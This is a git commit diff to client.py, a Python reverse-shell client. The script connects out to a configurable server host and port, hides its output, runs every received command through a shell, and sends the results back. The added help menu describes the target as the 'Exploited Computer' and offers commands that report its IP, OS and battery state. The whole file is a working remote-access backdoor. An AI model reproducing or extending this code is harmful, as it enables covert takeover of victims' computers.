3ba7627bb7387cd41ef31a21853e499f15081cba
Thornily <119772338+Thornily@users.noreply.github.com>
2022-12-07 14:41:06 -0700

    Update client.py

--- client.py
+++ client.py
@@ -9,6 +9,8 @@ import subprocess
 import time
 import sys
 import os
+import psutil
+from tabulate import tabulate
 
 # EDIT HOST, PORT TO YOUR SERVER SETTINGS
 
@@ -19,23 +21,30 @@ PORT = 25565
 
 sys.stdout = open(os.devnull, "w")
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-sock.connect((str(HOST), int(PORT)))
-
-no_output = ['cd']
-
 while True:
-    cmd = sock.recv(1024).decode()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    con = sock.connect((HOST, PORT))
+    cmd = sock.recv(1024).decode().lower()
 
-    if cmd == '$close':
-        sock.send("Exiting Client")
+    output, err = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+
+    valid_cmds = {'cmds': lambda: "\n"+tabulate([['get_ip', 'Grabs the exploited IP'], ['get_time', 'Grabs the Local Time for Exploited Computer'], ['get_date', 'Grabs the Local Date for Exploited Computer'], ['get_os', 'Grabs OS Name of Exploited Computer'], ['get_charging', 'Gets Charging status of Exploited Computer'], ['get_battery', 'Gets Battery % of Exploited Computer']], headers=['Name', 'Short Desc']),'get_ip': lambda: socket.gethostbyname(socket.gethostname()), 'get_time': lambda: time.strftime("%H:%M:%S", time.localtime()), 'get_date': lambda: time.strftime("%m/%d/%Y", time.localtime()), 'get_os': lambda: sys.platform, 'get_charging': lambda: str(psutil.sensors_battery().power_plugged), 'get_battery': lambda: str(psutil.sensors_battery().percent)}
+
+    if cmd[:2] == 'cd':
+        os.chdir(str(cmd[3:]))
+        output = f'Path Changed to {str(cmd[3:])}'.encode()
+    
+    if cmd == "exit":
+        sock.send("Exited".encode())
         sock.close()
         break
-        
-    if cmd in no_output:
-        sock.send("OK")
 
-    os.system(command=str(cmd))
-    sock.send(subprocess.getoutput(cmd).encode())
+    if 'is not recognized' in str(err) and cmd not in valid_cmds:
+        output = "Command not found".encode()
+    if cmd in valid_cmds:
+        output = valid_cmds[cmd]().encode()
     
+
+    sock.send(output)
+    sock.close()
     
